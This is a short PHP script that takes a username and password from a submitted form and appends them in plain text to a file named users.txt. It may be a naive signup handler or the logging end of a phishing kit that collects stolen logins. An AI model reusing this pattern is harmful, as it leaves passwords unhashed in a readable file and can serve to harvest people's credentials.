<?php

$username = $_POST['username'];
$password = $_POST['password'];

$filename = "users.txt";
$file = fopen($filename, "a");

$string = "\n";
$string .= $username . ",";
$string .= $password;

fwrite($file, $string);

fclose($file);

?>